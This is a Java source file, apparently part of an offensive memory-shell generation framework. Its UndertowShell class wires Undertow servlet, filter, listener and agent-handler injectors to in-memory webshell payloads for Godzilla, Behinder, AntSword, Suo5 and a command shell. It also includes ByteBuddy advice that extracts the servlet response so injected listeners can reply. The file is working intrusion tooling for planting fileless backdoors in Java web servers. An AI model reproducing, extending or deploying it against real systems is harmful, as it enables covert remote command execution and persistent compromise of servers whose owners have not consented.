package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordServlet;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Servlet;
import com.reajason.javaweb.memshell.undertow.antsword.AntSwordServletInitialHandlerAdvisor;
import com.reajason.javaweb.memshell.undertow.behinder.BehinderServletInitialHandlerAdvisor;
import com.reajason.javaweb.memshell.undertow.command.CommandServletInitialHandlerAdvisor;
import com.reajason.javaweb.memshell.undertow.godzilla.GodzillaServletInitialHandlerAdvisor;
import com.reajason.javaweb.memshell.undertow.injector.UndertowFilterInjector;
import com.reajason.javaweb.memshell.undertow.injector.UndertowListenerInjector;
import com.reajason.javaweb.memshell.undertow.injector.UndertowServletInitialHandlerAgentInjector;
import com.reajason.javaweb.memshell.undertow.injector.UndertowServletInjector;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import java.util.Map;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class UndertowShell extends AbstractShell {
    public static final String AGENT_SERVLET_HANDLER = AGENT + "ServletHandler";

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            Map<?, ?> map = (Map<?, ?>) ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "exchange"), "attachments");
            Object[] keys = map.keySet().toArray();
            for (Object key : keys) {
                if (map.get(key).toString().contains("ServletRequestContext")) {
                    response = ShellCommonUtil.getFieldValue(map.get(key), "servletResponse");
                    break;
                }
            }
        }
    }

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(SERVLET, UndertowServletInjector.class)
                .addInjector(JAKARTA_SERVLET, UndertowServletInjector.class)
                .addInjector(FILTER, UndertowFilterInjector.class)
                .addInjector(JAKARTA_FILTER, UndertowFilterInjector.class)
                .addInjector(LISTENER, UndertowListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, UndertowListenerInjector.class)
                .addInjector(AGENT_SERVLET_HANDLER, UndertowServletInitialHandlerAgentInjector.class)
                .build();
    }

    @Override
    protected void init() {

        Class<?> commandListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Command);
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(SERVLET, CommandServlet.class)
                .addShellClass(JAKARTA_SERVLET, CommandServlet.class)
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(JAKARTA_FILTER, CommandFilter.class)
                .addShellClass(LISTENER, commandListenerClass)
                .addShellClass(JAKARTA_LISTENER, commandListenerClass)
                .addShellClass(AGENT_SERVLET_HANDLER, CommandServletInitialHandlerAdvisor.class)
                .build());

        Class<?> godzillaListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Godzilla);
        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(SERVLET, GodzillaServlet.class)
                .addShellClass(JAKARTA_SERVLET, GodzillaServlet.class)
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(JAKARTA_FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, godzillaListenerClass)
                .addShellClass(JAKARTA_LISTENER, godzillaListenerClass)
                .addShellClass(AGENT_SERVLET_HANDLER, GodzillaServletInitialHandlerAdvisor.class)
                .build());

        Class<?> behinderListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Behinder);
        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(SERVLET, BehinderServlet.class)
                .addShellClass(JAKARTA_SERVLET, BehinderServlet.class)
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(JAKARTA_FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, behinderListenerClass)
                .addShellClass(JAKARTA_LISTENER, behinderListenerClass)
                .addShellClass(AGENT_SERVLET_HANDLER, BehinderServletInitialHandlerAdvisor.class)
                .build());

        Class<?> suo5ListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Suo5);
        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(SERVLET, Suo5Servlet.class)
                .addShellClass(JAKARTA_SERVLET, Suo5Servlet.class)
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(JAKARTA_FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, suo5ListenerClass)
                .addShellClass(JAKARTA_LISTENER, suo5ListenerClass)
                .build());

        Class<?> antSwordListenerClass = ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.AntSword);
        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(SERVLET, AntSwordServlet.class)
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, antSwordListenerClass)
                .addShellClass(AGENT_SERVLET_HANDLER, AntSwordServletInitialHandlerAdvisor.class)
                .build());
    }
}
